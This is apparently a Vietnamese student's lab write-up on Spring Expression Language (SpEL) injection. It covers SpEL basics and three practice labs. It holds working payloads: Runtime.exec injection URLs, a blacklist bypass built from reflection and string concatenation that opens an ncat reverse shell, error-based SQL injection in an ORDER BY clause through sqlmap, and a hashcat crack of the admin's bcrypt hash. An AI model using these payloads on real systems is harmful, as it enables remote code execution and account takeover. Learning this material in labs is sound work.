# Task 3

## giới thiệu

spring framework cung cấp khoảng 20 modules, những modules này có thể được sử dụng đựa trên yêu cấu của ứng dụng. Hình ảnh dưới đây mô phỏng là các modules cơ bản của spring framwrok:

![image](https://hackmd.io/_uploads/SyOCCyXWJg.png)

Core container bao gồm 4 modules: Core, Bean, Context và Expression Leanguage (SpEL). Mô tả chi tiết về chúng như sau:

- Core module: module này cung cấp các thành phần cơ bản của spring framework, bao gồm IoC và chức năng Dependency Injection.
- Bean module: module này cung cấp BeanFactory, là một sự triển khai phức tạp của Factory pattern.
- Context module: module này xây dựng trên một nền tảng vững chắc được cung cấp bởi Core và Bean module. Nó cũng là một môi trường để truy cập vào bất kì object nào được định nghĩa và configured. Interface Application context là thành phần quan trọng của Context module.
- SpEL module: module này cung cấp một dạng ngôn ngữ rất tiện ích cho việc query và thao tác các object tại thời điểm runtime.

SpEL Injection là viết tắt của "Spring Expression Language Injection". Đây là một lỗ hổng bảo mật xảy ra khi các biểu thức trong Spring Expression Language (SpEL) được thực thi mà không kiểm tra đầu vào. Điều này có thể dẫn đến việc kẻ tấn công chèn các biểu thức độc hại vào ứng dụng, từ đó chiếm quyền điều khiển hoặc truy cập vào các tài nguyên không mong muốn.

SpEL thường được sử dụng trong các ứng dụng Java Spring để đánh giá và thực thi các biểu thức, cung cấp tính năng động cho ứng dụng. Tuy nhiên, nếu không có cơ chế kiểm tra chặt chẽ, SpEL Injection có thể bị khai thác để thực thi mã từ xa, truy vấn dữ liệu nhạy cảm, hoặc thực hiện các tác vụ trái phép.

## phân tích

Việc sử dụng SpEL tương đối phổ biến trong Spring Framework. Một ví dụ điển hình là Spring Security , trong đó biểu thức SpEL được sử dụng để gán quyền:

```
@PreAuthorize("hasPermission(#contact, 'admin')")
public void deletePermission(Contact contact, Sid recipient, Permission permission);
```

![image](https://hackmd.io/_uploads/ryTEYxfb1g.png)

Việc sử dụng SPEL có thể được chia thành các cách sau:

- dùng anotation : Annotation @Value cho phép bạn gán giá trị cho các thuộc tính từ cả Property Placeholder (${}) lẫn SpEL (#{}).

```java
@Value("${app.name}")
private String appName;  // Sử dụng Property Placeholder

@Value("#{T(java.lang.Math).random() * 100}")
private double randomValue;  // Sử dụng SpEL

```

- phân tích cú pháp thông qua inteface do thành phần SPEL cung cấp
  - SpEL thường chia nó thành bốn bước để tìm giá trị của một biểu thức, trong đó bước thứ ba là tùy chọn: đầu tiên xây dựng trình phân tích cú pháp, sau đó trình phân tích cú pháp phân tích biểu thức chuỗi, xây dựng ngữ cảnh ở đây và cuối cùng thu được giá trị sau thao tác biểu thức dựa trên bối cảnh.
  - Một điều cần lưu ý là parseExpression()nó chứa 2 tham số. Nếu có tham số thứ hai ParserContextthì POC cần được #{}bao quanh.

```java
ExpressionParser parser = new SpelExpressionParser();
String poc = "T(Runtime).getRuntime().exec('calc')";
EvaluationContext context = new StandardEvaluationContext();
parser.parseExpression(poc).getValue(context);
```

![image](https://hackmd.io/_uploads/B1uZBx7-kx.png)

- XML

```xml
<bean id=“exmple" class="org.spring.samples.NumberGuess">
<property name="randomNumber" value="#{ T(java.lang.Math).random() * 100.0 }"/>
<property name="defaultLocale" value="#{ systemProperties['user.region'] }"/>
<property name="defaultLocale2" value="${user.region}"/>
</bean>
```

- ==#{}== sử dụng Spring Expression Language (SpEL) để thực hiện các phép tính, gọi hàm, hoặc truy cập vào thuộc tính của các đối tượng. Nó cho phép viết các biểu thức động trong file cấu hình.
- ==${}== được sử dụng để thay thế các giá trị từ properties file (các file cấu hình riêng biệt như application.properties), hoặc từ các biến môi trường và hệ thống. Property Placeholder thường được dùng để cấu hình các giá trị không thay đổi trong quá trình runtime, chẳng hạn như URL cơ sở dữ liệu, thông tin cấu hình, hoặc biến môi trường.

Dưới đây là những gì SpEL có thể làm được:

### 1. Truy cập vào thuộc tính của đối tượng, gọi các phương thức của đối tượng, Gọi các bean khác và phương thức từ bean

- SpEL cho phép truy cập vào các thuộc tính của đối tượng Spring hoặc biến môi trường:

```xml
<property name="appName" value="#{systemProperties['user.name']}" />
```

- Truy cập vào biến hệ thống user.name và sử dụng giá trị này để khởi tạo một thuộc tính.
- `"#variableName"` trong các biểu thức dùng để tham chiếu đến các biến ; ngoài việc tham chiếu đến các biến tùy chỉnh, Spel còn cho phép tham chiếu đến đối tượng gốc và đối tượng bối cảnh hiện tại, bằng cách sử dụng `" #root"` để tham chiếu Đối tượng gốc, sử dụng `"#this"` để tham chiếu đối tượng bối cảnh hiện tại;

- Có thể gọi các phương thức của lớp Java hoặc Spring beans:

```xml
<property name="randomNumber" value="#{ T(java.lang.Math).random() * 100 }"/>
```

- Gọi phương thức Math.random() và nhân với 100 để tạo số ngẫu nhiên.

- SpEL có thể sử dụng để gọi các bean Spring khác hoặc truy cập thuộc tính của chúng:

```xml
<property name="databaseUrl" value="#{dataSource.url}" />
```

- Lấy giá trị thuộc tính url từ bean có tên là dataSource.

### 2. Tạo các biểu thức toán học

- SpEL hỗ trợ các biểu thức toán học như cộng, trừ, nhân, chia và mod:

```xml
<property name="calculatedValue" value="#{10 + 20 * 2}" />
```

- Biểu thức trên sẽ tính giá trị 10 + 20 \* 2 = 50.

### 3. Điều kiện logic (Logical expressions)

- SpEL hỗ trợ các biểu thức logic and, or, not, và các biểu thức điều kiện ternary:

```xml
<property name="mode" value="#{environment == 'production' ? 'LIVE' : 'TEST'}" />
```

- Nếu environment là production, mode sẽ là LIVE; ngược lại, mode là TEST.

### 4. Tạo các đối tượng (Object creation)

- SpEL có thể khởi tạo các đối tượng mới trực tiếp trong biểu thức:

```xml
<property name="date" value="#{new java.util.Date()}" />

```

- Tạo một instance mới của Date ngay trong biểu thức.

### 5. Gọi phương thức static

- Dùng cú pháp T(ClassName).methodName để gọi phương thức static:ư

```xml
<property name="piValue" value="#{T(java.lang.Math).PI}" />
```

- Lấy giá trị hằng số PI từ lớp Math.

### 6. Làm việc với Collections (Danh sách, Map)

- SpEL hỗ trợ truy cập vào phần tử của danh sách hoặc map:

```xml
<property name="firstItem" value="#{myList[0]}" />
<property name="mapValue" value="#{myMap['key']}" />
```

- Lấy phần tử đầu tiên trong myList và giá trị với key key từ myMap.

### 7. Gọi Constructor của Class

Bạn có thể gọi constructor để tạo một instance mới của một class cụ thể:

```xml
<property name="user" value="#{new com.example.User('John', 30)}" />
```

- Khởi tạo đối tượng User với các tham số "John" và 30.

### 8. Biểu thức Regex và Pattern Matching

- Bạn có thể sử dụng SpEL để kiểm tra pattern với biểu thức regex:

```java
@Value("#{'123-45-6789' matches '\\d{3}-\\d{2}-\\d{4}'}")
private boolean isValidSSN; // Kiểm tra định dạng SSN của Mỹ
```

### 9. Sử dụng các hàm tiện ích trong SpEL

SpEL cung cấp các hàm tiện ích cho String và Collections, ví dụ như contains, substring, size, v.v.:

```java
@Value("#{'Hello World'.substring(0, 5)}")
private String hello; // Kết quả là "Hello"

@Value("#{users.size()}")
private int userCount; // Số phần tử trong danh sách users
```

### 10. Collection Selection

Selection `(.?[condition]):` Dùng để lọc các phần tử trong collection dựa trên một điều kiện nhất định.

```java
@Value("#{users.?[age > 18]}")
private List<User> adults; // Lọc các user có tuổi trên 18
```

### 11. Projection

- Projection `(.^[condition], .$[condition])`: Trả về phần tử đầu tiên `(.^[condition])` hoặc cuối cùng `(.$[condition])` thỏa mãn điều kiện.

```java
@Value("#{users.^[age > 18]}")
private User firstAdult; // Lấy user đầu tiên có tuổi trên 18
```

### 12. Sử dụng các biến trong SpEL (Variables)

Trong SpEL, bạn có thể khai báo các biến bằng cách sử dụng cú pháp #variableName và gán giá trị bằng cách sử dụng setVariable trong EvaluationContext:

```java
StandardEvaluationContext context = new StandardEvaluationContext();
context.setVariable("multiplier", 10);

ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression("#multiplier * 2");
Integer result = expression.getValue(context, Integer.class); // Kết quả là 20
```

SimpleEvaluationContext và StandardEvaluationContext là hai EvaluationContexts do SpEL cung cấp:

- SimpleEvaluationContext - Hiển thị một tập hợp con các tính năng và tùy chọn cấu hình ngôn ngữ SpEL cho các lớp biểu thức không yêu cầu phạm vi đầy đủ của cú pháp ngôn ngữ SpEL và cần được hạn chế có chủ ý.
- StandardEvaluationContext - Hiển thị đầy đủ các tính năng và tùy chọn cấu hình ngôn ngữ SpEL. Bạn có thể sử dụng nó để chỉ định đối tượng gốc mặc định và định cấu hình từng chính sách liên quan đến đánh giá có sẵn.
- SimpleEvaluationContext được thiết kế để chỉ hỗ trợ một tập hợp con cú pháp ngôn ngữ SpEL, ngoại trừ các tham chiếu kiểu Java, hàm tạo và tham chiếu Bean trong khi StandardEvaluationContext hỗ trợ tất cả cú pháp SpEL.

Được sử dụng theo mặc địnhStandardEvaluationContext

SpEL thường chia nó thành bốn bước để tìm giá trị của một biểu thức, trong đó bước thứ ba là tùy chọn: đầu tiên xây dựng trình phân tích cú pháp, sau đó trình phân tích cú pháp phân tích biểu thức chuỗi, xây dựng ngữ cảnh ở đây và cuối cùng thu được giá trị sau thao tác biểu thức dựa trên bối cảnh.

```java
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression("('Hello' + ' Mi1k7ea').concat(#end)");
EvaluationContext context = new StandardEvaluationContext();
context.setVariable("end", "!");
System.out.println(expression.getValue(context));
```

1. Tạo trình phân tích cú pháp: SpEL sử dụng giao diện ExpressionParser để thể hiện trình phân tích cú pháp và cung cấp cách triển khai mặc định của SpelExpressionParser;
2. Phân tích biểu thức: Sử dụng parseExpression của ExpressionParser để phân tích biểu thức tương ứng thành một đối tượng Biểu thức;
3. Xây dựng ngữ cảnh: chuẩn bị dữ liệu ngữ cảnh cần thiết cho các biểu thức như định nghĩa biến, v.v.;
4. Đánh giá: Lấy giá trị biểu thức theo ngữ cảnh thông qua phương thức getValue của giao diện Biểu thức;

- https://github.com/bfengj/CTF/blob/main/Web/java/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md

```java
ExpressionParser parser = new SpelExpressionParser();
String poc = "T(Runtime).getRuntime().exec('calc')";
EvaluationContext context = new StandardEvaluationContext();
parser.parseExpression(poc).getValue(context);
```

- Quy trình tấn công tiêm nhiễm SpEL phổ biến được hiển thị trong . Các điều kiện cơ bản cho lỗ hổng này là: sử dụng StandardEvaluationContext, 2. SpEL đầu vào không được xác minh, 3. Phương thức getValue() hoặc setValue() được gọi trên biểu thức. Khi các điều kiện trên được đáp ứng, cơ hội sẽ được trao cho kẻ tấn công.

## payload thường dùng

```java
${12*12}
T(java.lang.Runtime).getRuntime().exec("nslookup a.com")
T(Thread).sleep(10000)
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')
new java.lang.ProcessBuilder({'nslookup a.com'}).start()
```

- phòng chống: sử dụng `SimpleEvaluationContext`

## Lab 1

- link: https://github.com/jzheaux/spel-injection/tree/master

### `/widget/search`

#### Phân tích

- Điểm cuối này không thực hiện SpEL và do đó không thể bị khai thác spel injection

```java
@GetMapping("/search")
	public Set<Widget> findWidgets(@RequestParam("term") String term) {
		return repo.findByNameContaining(term);
	}

```

### `/widget/unsafe-search`

#### Phân tích

- Điểm cuối này sử dụng StandardEvaluationContext, cấp quyền truy cập vào Runtime. Điểm cuối không xác minh đầu vào của người dùng, lấy đầu vào của người dùng đó và biên soạn thành biểu thức SpEL.

```java
@GetMapping("/unsafe-search")
	public Set<Widget> unsafeFindWidgetsAdvancedly(@RequestParam("term") String term,@RequestParam("filter") String filter) {
            Set<Widget> widgets = this.repo.findByNameContaining(term);
		StandardEvaluationContext context = new StandardEvaluationContext(widgets);
		Expression expression = this.parser.parseExpression("#this.?[enabled and (" + filter + ")]");
		return new LinkedHashSet<>((Collection<Widget>)expression.getValue(context));
	}
```

![image](https://hackmd.io/_uploads/SJM9CFub1e.png)

- Biểu thức `#this.?[enabled and (" + filter + ")]` sử dụng filter để xây dựng một biểu thức điều kiện, nhưng vì filter không được kiểm tra tính hợp lệ, kẻ tấn công có thể truyền vào mã độc SpEL (như các phương thức hệ thống hoặc các truy vấn dữ liệu nguy hiểm).

- Trong SpEL (Spring Expression Language), đoạn `#this.?[enabled and (filter)]` là một biểu thức lọc dữ liệu, có chức năng như sau:
  - `#this`: Tham chiếu đến đối tượng hiện tại trong ngữ cảnh, ở đây là widgets, một tập hợp `(Set<Widget>)` các đối tượng Widget.
  - `.?[...]:` Là một toán tử lọc của SpEL. Nó sẽ duyệt qua từng phần tử trong tập hợp widgets và chỉ giữ lại những phần tử thỏa mãn điều kiện bên trong dấu ngoặc vuông `[...]`.
  - enabled: mỗi Widget có một thuộc tính enabled kiểu boolean. Phần này kiểm tra xem Widget có được kích hoạt (enabled) hay không
  - and (filter): Đây là phần mở rộng điều kiện. Kết hợp với filter (tham số từ người dùng), biểu thức này cho phép áp dụng thêm điều kiện lọc khác, miễn là filter hợp lệ.

#### Khai thác

- vậy với payload sau có thể thực thi được command trên server

```java
filter= T(java.lang.Runtime).getRuntime().exec('malicious_command')
```

- Server sẽ dùng module Spel để phân tích và gọi phương thức exec của lớp java.lang.Runtime

![image](https://hackmd.io/_uploads/SkVkN9OWke.png)

```http
http://localhost:8080/widget/unsafe-search?term=Widget&filter=1==1%20or%20T(java.lang.Runtime).getRuntime().exec(%27calc%27)
```

![image](https://hackmd.io/_uploads/Hyr_EcO-ke.png)

```http
http://localhost:8080/widget/unsafe-search?term=Widget&filter=1==2%20or%20T(java.lang.Runtime).getRuntime().exec(%27calc%27)
```

![image](https://hackmd.io/_uploads/SkNYNqOZJx.png)

hoặc tạo 1 tiến trình khác để thực thi command

```http
http://localhost:8080/widget/unsafe-search?term=Widget&filter=(new%20java.lang.ProcessBuilder(%22calc%22).start())
```

### `/widget/safer-search`

#### Phân tích

- Điểm cuối này sử dụng SimpleEvaluationContext, bảo vệ quyền truy cập Runtimetheo mặc định. Tuy nhiên, điểm cuối vẫn không xác minh dữ liệu đầu vào của người dùng, nghĩa là vẫn có thể xảy ra một số cuộc tấn công.

```java
	@GetMapping("/safer-search")
	public Set<Widget> saferFindWidgetsAdvancedly(@RequestParam("term") String term,
												  @RequestParam("filter") String filter) {

		Set<Widget> widgets = this.repo.findByNameContaining(term);

		// SimpleEvaluationContext takes a whitelist approach, requiring the code to explicitly enable
		// bean resolution, property access, and type resolution

		// In this case, the code is only allowing read access to properties derivable from the context
		SimpleEvaluationContext context =
				new SimpleEvaluationContext.Builder(DataBindingPropertyAccessor.forReadOnlyAccess())
					.withRootObject(widgets).build();

		// still though, query composition is a dangerous business
		filter = "#this.?[enabled and (" + filter + ")]";
		Expression expression = this.parser.parseExpression(filter);
		return new LinkedHashSet<>((Collection<Widget>)expression.getValue(context));
	}
```

- Đoạn code này vẫn có nguy cơ bị SpEL injection do cách sử dụng chuỗi filter từ tham số người dùng trong biểu thức SpEL. Mặc dù SimpleEvaluationContext giúp giới hạn truy cập chỉ đọc (read-only access) và hạn chế các khả năng như truy cập đến các loại (class) hoặc thực thi mã (method execution), nhưng bản thân chuỗi filter vẫn được truyền trực tiếp mà không qua bước kiểm tra hoặc lọc an toàn.
  - Truy cập vào bean (bean resolution): SimpleEvaluationContext không cho phép truy cập đến các Spring bean khác trong ứng dụng. Điều này ngăn chặn kẻ tấn công sử dụng biểu thức để truy cập hoặc thao tác các bean khác, giảm thiểu khả năng xâm phạm hệ thống.
  - Truy cập thuộc tính chỉ đọc (read-only property access): DataBindingPropertyAccessor.forReadOnlyAccess() chỉ cho phép truy cập thuộc tính ở chế độ đọc. Điều này có nghĩa là người dùng chỉ có thể lấy dữ liệu từ các thuộc tính của Widget, mà không thể sửa đổi chúng qua biểu thức SpEL.
  - Truy cập vào lớp (type resolution): SimpleEvaluationContext không cho phép truy cập vào các lớp (class) Java hoặc thực thi các phương thức (method execution). Điều này ngăn chặn việc gọi các phương thức tĩnh (như Runtime.getRuntime().exec) hoặc truy cập vào các lớp nhạy cảm như java.lang.System, java.lang.Runtime.

SimpleEvaluationContext với DataBindingPropertyAccessor.forReadOnlyAccess() sẽ giới hạn quyền truy cập vào các thuộc tính của đối tượng theo cơ chế chỉ đọc. Điều này giảm thiểu rủi ro thực thi lệnh trái phép (RCE) qua SpEL, vì nó không cho phép truy cập và thay đổi các lớp, phương thức hệ thống hoặc gọi các phương thức nhạy cảm như Runtime.exec

- Mặc dù việc sử dụng nó SimpleEvaluationContextgiúp ngăn chặn việc tiêm SpEL nhưng vẫn không có tính năng lọc bảo mật của các tham số gửi đến, do đó vẫn có thể xảy ra một cuộc tấn công từ chối dịch vụ:

### `/widget/safest-search`

#### Phân tích

- Điểm cuối này sử dụng SimpleEvaluationContext cũng như giới thiệu một danh sách trắng bảo vệ chống lại dữ liệu đầu vào độc hại của người dùng.

### `/widget/impermeable-search`

- Điểm cuối này sử dụng 'SimpleEvaluationContext', không cho phép bất kỳ chuỗi nối nào của truy vấn và ép buộc các tham số vào các kiểu dữ liệu mạnh.

## Lab 2

- link lab: https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar

### Phân tích

- em unzip file jar và lấy đc cridential đăng nhập trong `/BOOT-INF/classes/application.yml`

```
username: admin
password: admin
```

![image](https://hackmd.io/_uploads/rkFV_jFW1l.png)

thấy được blacklist gồm có

```
 blacklist:
    - java.+lang
    - Runtime
    - exec.*\(
```

Xem MainController.class, nó định nghĩa thuộc tính ExpressionParser, được gọi trong hàm getAdvanceValue() để phân tích nội dung chuỗi. Có thể thấy rằng hàm getAdvanceValue() là điểm kích hoạt. để tiêm SpEL

![image](https://hackmd.io/_uploads/ryf-ijYZye.png)

- và hàm getAdvanceValue() được gọi trong hàm class khi request đến trang chính

![image](https://hackmd.io/_uploads/S1ccisF-yx.png)

- trong request đăng nhập đoạn code được xử lý như sau:

```java!
  @PostMapping({"/login"})
    public String login(@RequestParam(value = "username", required = true) String username, @RequestParam(value = "password", required = true) String password, @RequestParam(value = "remember-me", required = false) String isRemember, HttpSession session, HttpServletResponse response) {
        if (this.userConfig.getUsername().contentEquals(username) && this.userConfig.getPassword().contentEquals(password)) {
            session.setAttribute("username", username);
            if (isRemember != null && !isRemember.equals("")) {
                Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe());
                c.setMaxAge(2592000);
                response.addCookie(c);
                return "redirect:/";
            }
            return "redirect:/";
        }
        return "redirect:/login-error";
    }
```

- Nó truyền vào 3 tham số, tùy chọn thứ ba là không bắt buộc
- nếu tên người dùng và mật khẩu là chính xác, session.setAttribute("username")đặt giá trị tên người dùng trong session
- sau đó xác định giá trị của Remember-me để đặt, sau đó chuyển hướng đến trang chính, nếu không, đăng nhập không thành công và thông báo lỗi sẽ được trả về trực tiếp

- khi đăng nhập với remember me em thấy cookie được set thêm trường `remember-me=MXPUSANQRVaBJYtUucUgmQ==;`

![image](https://hackmd.io/_uploads/SyvNcYKW1g.png)

- và giá trị này được tạo ra từ hàm encryptRememberMe() trong lớp userConfig `Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe());`

- hàm này sẽ được gọi đến hàm encryt có truyền vào 3 tham số lần lượt là `rememberMeKey: c0dehack1nghere1 ` , `0123456789abcdef` và username được được lấy trong session khi đăng nhập thành công

![image](https://hackmd.io/_uploads/ByREy3tZ1g.png)

- trong encrytor thấy

![image](https://hackmd.io/_uploads/ByKKy3Fbyl.png)

- em thử encode lại thấy ra giống với chuỗi rememeber-me mà server trả về cho tài khoản admin

![image](https://hackmd.io/_uploads/ryRUm3K-1x.png)

- em thử đổi username thành "cuong" và thay đổi giá trị trong trường remember-me và thấy nó đã được đánh giá qua hàm getAdvanceValue() và render ra giao diện

![image](https://hackmd.io/_uploads/rkdMBnt-1e.png)

![image](https://hackmd.io/_uploads/HkNuD3Y-yx.png)

- nhưng khi nhập payload `T(java.lang.Runtime).getRuntime().exec('malicious_command')` thì nó sẽ bị cấm trong backlist và trả về mã 403

```
 blacklist:
    - java.+lang
    - Runtime
    - exec.*\(
```

![image](https://hackmd.io/_uploads/H1iRfaKWke.png)

![image](https://hackmd.io/_uploads/SJzAGpY-kl.png)

- Trong Java, cơ chế phản chiếu (Reflection) cho phép bạn truy cập và thao tác với các lớp, phương thức và thuộc tính của một đối tượng tại thời gian chạy. Hai phương thức phổ biến trong cơ chế này là forName() và getMethod(). - Class.forName() được sử dụng để tải một lớp vào bộ nhớ bằng tên đầy đủ của lớp (bao gồm cả package) và trả về một đối tượng Class đại diện cho lớp đó.VD: `Class<?> clazz = Class.forName("java.util.ArrayList");`. Ở đây, clazz sẽ là một đối tượng Class đại diện cho lớp ArrayList trong Java. - getMethod() được sử dụng để lấy một phương thức công khai (public) cụ thể của lớp dựa trên tên của phương thức và các tham số đầu vào. VD: `Class<?> clazz = Class.forName("java.lang.String");
Method method = clazz.getMethod("substring", int.class, int.class);`. method là một đối tượng Method đại diện cho phương thức substring(int beginIndex, int endIndex) của lớp String.

- invoke(): - Gọi thực thi phương thức Method đã lấy được trên một đối tượng cụ thể.
  Khi gọi invoke() trên phương thức, nó sẽ thực hiện phương thức đó với tham số truyền vào (nếu có), và trả về kết quả nếu phương thức có giá trị trả về.

### Khai thác

- với cách dùng Reflection như trên em không phải gọi hàm trực tiếp qua class java.lang.Runtime mà thay vào đó là tạo đối tượng của lớp này thông qua forName() và dùng các method của đối tượng này thông qua getMethod().invoke()

```java!
#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})}
```

- thông qua payload này em có thể bypass được blacklist qua việc nối chuỗi
- với payload này em có thể trigger được lỗi

![image](https://hackmd.io/_uploads/rygy53K-kg.png)

- tiếp đến để RCE và lấy được thông tin trả về từ server em dùng payload sau

```java!
#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","ncat 127.0.0.1 8000 -e cmd.exe"})}
```

![image](https://hackmd.io/_uploads/rk4HBgqWkx.png)

![image](https://hackmd.io/_uploads/rJB2Ex9-Jg.png)

- http://rui0.cn/archives/1015

## Lab3

- BearBurger

### Phân tích

- đọc source code em tìm thấy đoạn code xử lý SPEL tại lớp triển khai service qua hàm fetchAllUsers()

![image](https://hackmd.io/_uploads/SkgjxNsbyl.png)

- em đem search trong controller và thấy hàm này sẽ được gọi khi request GET đến api `/api/v1/admin/fetch-all-users` trong UserController

![image](https://hackmd.io/_uploads/Syl04Ns-yx.png)

- tuy nhiên khi đăng ký và đăng nhập với user thường em không có quyền truy cập vào api này

![image](https://hackmd.io/_uploads/S1QaBEsWkx.png)

- đọc file AppSecurityConfig em thấy được các api được phân quyền cho từng user tại đây

```java
public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
        ((HttpSecurity)((HttpSecurity)((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)httpSecurity.authorizeRequests().antMatchers(new String[]{"/api/v1/admin/**", "/dashboard", "/manage-roles", "/manage-user", "/add-user", "/manage-food", "/add-food"})).hasRole("ADMIN").antMatchers(new String[]{"/profile", "/profile-modify", "/payment", "/comments"})).hasAnyRole(new String[]{"CUSTOMER", "ADMIN"}).antMatchers(new String[]{"/"})).permitAll().and()).formLogin().loginPage("/login").usernameParameter("username").passwordParameter("password").defaultSuccessUrl("/login-success")).failureUrl("/login?error")).and()).rememberMe().rememberMeParameter("remember-me").rememberMeCookieName("BearBurger-LoggedIn-User").tokenValiditySeconds((int)TimeUnit.DAYS.toSeconds(68L)).key("Raofin").and()).logout().logoutRequestMatcher(new AntPathRequestMatcher("/logout")).logoutSuccessUrl("/login").and()).exceptionHandling().accessDeniedPage("/403");
        return (SecurityFilterChain)httpSecurity.build();
    }
```

- em thấy được các api sau: `/api/v1/admin/**`, `/dashboard`, `/manage-roles`, `/manage-user`, `/add-user`, `/manage-food`, `/add-food`: Chỉ cho phép người dùng có vai trò ADMIN truy cập các URL này (hasRole("ADMIN")).
- `/profile`, `/profile-modify`, `/payment`, `/comments`: Cho phép người dùng có vai trò CUSTOMER hoặc ADMIN truy cập (hasAnyRole("CUSTOMER", "ADMIN")).

- vậy để khai thác được SPEL injection em cần leo quyền ADMIN

- để ý trong service FoodServiceImpl có triển khai các hàm xử lý thực hiện truy vấn đến database có xử dụng tham số hóa đầu vào. Tuy nhiên đến hàm findByCategory() lại có thực hiện nối chuỗi trong câu truy vấn có thể bị SQL injection mà chức api thực hiện hàm này không cần xác thực. Tại đây và nếu khai thác thành công em có thể lấy được credential của admin ==> account take over và dẫn đến leo quyền

```java!
public List<Food> findByCategory(String category, String sorting) {
        String jpqlQuery = "SELECT f FROM Food f WHERE f.category = :category ORDER BY " + sorting + " DESC";
        return this.entityManager.createQuery(jpqlQuery, Food.class).setParameter("category", category).getResultList();
    }
```

![image](https://hackmd.io/_uploads/H1WxrrjWJl.png)

### Khai thác

```bash
sqlmap -u "http://192.168.228.215:8085/api/v1/fetch-foods-by-category/Pizza/price*" --batch --threads=10  --risk=3 --level=5   --dbms=MySQL
```

- thấy có thể khai thác theo boolean base , time base sql

![image](https://hackmd.io/_uploads/rk4UCrsbye.png)

- thấy java có thể thực hiện stack query với MySQL với 1 số cấu hình thêm và em thử ném file pom.xml và application.properties vào chatGPT thấy có đủ điều kiện này nhưng có vẻ như truy vấn qua ORM đã chặn kiểu chèn này

![image](https://hackmd.io/_uploads/Hy0qAVoWke.png)

- https://portswigger.net/support/sql-injection-in-the-query-structure
- Việc khai thác SQL injection trong mệnh đề ORDER BY khác biệt đáng kể so với hầu hết các trường hợp khác. Cơ sở dữ liệu sẽ không chấp nhận từ khóa UNION, WHERE, OR hoặc AND tại thời điểm này trong truy vấn. Trong lab cả ký tự comment cũng không hoạt động ![image](https://hackmd.io/_uploads/HymIg8nWJg.png)

- việc khai thác yêu cầu kẻ tấn công phải chỉ định một truy vấn lồng nhau thay cho tham số ORDER BY.

```sql
(CASE WHEN (select password from User u where u.username = 'admin' and binary(substr(u.password,1,1)) = '$' THEN id ELSE price END)
```

![image](https://hackmd.io/_uploads/BJN6BI3bJg.png)

![image](https://hackmd.io/_uploads/ryYfSI2Wyx.png)

- Lỗi này xảy ra do cú pháp JPQL không hỗ trợ các truy vấn con (subquery) trong biểu thức CASE WHEN bên trong ORDER BY. Trong JPQL, việc sử dụng truy vấn con phức tạp (chẳng hạn như truy cập User từ câu truy vấn Food) không được hỗ trợ trực tiếp như trong SQL.
- lỗi này xuất hiện do các hạn chế trong cú pháp của JPQL (Java Persistence Query Language). Cụ thể, JPQL không hỗ trợ các subquery (truy vấn con) trong các phần tử như CASE WHEN hoặc ORDER BY.

- nhưng dùng với XPATH để phân tích XML thì query của em được thực hiện

```
extractvalue(null,concat('===',(select password from User u where u.username = 'admin'),'==='))
```

![image](https://hackmd.io/_uploads/ryTVnLhWyl.png)

- Nếu như request select thành công, sẽ trả về lỗi

![image](https://hackmd.io/_uploads/S1P_h8hZye.png)

- Còn nếu như câu query sai, thì server sẽ không trigger error based nên sẽ hiển thị được thông tin bình thường:

![image](https://hackmd.io/_uploads/r1a6hL2byl.png)

![image](https://hackmd.io/_uploads/rJRPa8h-Je.png)

- em biết được password được mã hóa bcrypt trong database và chuỗi mã hóa bcrypt có độ dài cố định là 60 ký tự nên em tiến hành brute force

![image](https://hackmd.io/_uploads/ByLZ0L3Zke.png)

![image](https://hackmd.io/_uploads/SkCAkwhbkg.png)

![image](https://hackmd.io/_uploads/r1n2JPn-1l.png)

- em lấy được mật khẩu là
  `$2a$10$3l0p7n2pIIykRYaPsPbvt.8y60kvyNF9E7Q6e21sMi7tBRPqL8zvS`
- mang đi crack hashcat

```bash
hashcat -m 3200 -a 0 cracksql.txt /usr/share/wordlists/rockyou.txt --force
```

- em được mật khẩu của admin là admin

- và em đăng nhập thành công tài khoản admin

```java!
public List<User> fetchAllUsers() {
        List<User> result = this.userRepository.findAll();
        ExpressionParser userParser = new SpelExpressionParser();
        Iterator var3 = result.iterator();

        while(var3.hasNext()) {
            User user = (User)var3.next();

            try {
                Expression expression = userParser.parseExpression(user.getUsername());
                String var6 = (String)expression.getValue(String.class);
            } catch (Exception var7) {
            }
        }
```

- tiếp theo khai thác SPEL injection thấy đầu vào phân tích SPEL là username lấy từ database
- vậy nếu lúc đầu em đăng ký account với username là payload SPEL thì em có thể trigger được lỗi này
- em tiến hành đăng ký account với username là `T(java.lang.Runtime).getRuntime().exec('ncat 127.0.0.1 8000 -e cmd.exe')`

![image](https://hackmd.io/_uploads/BkNIO8j-Jx.png)

- tiếp đến để trigger lỗi này em request đến api : `/api/v1/admin/fetch-all-users`

![image](https://hackmd.io/_uploads/S1CM9LjZ1l.png)

- và em nhận được shell trả về

![image](https://hackmd.io/_uploads/Syzz5Ij-kg.png)
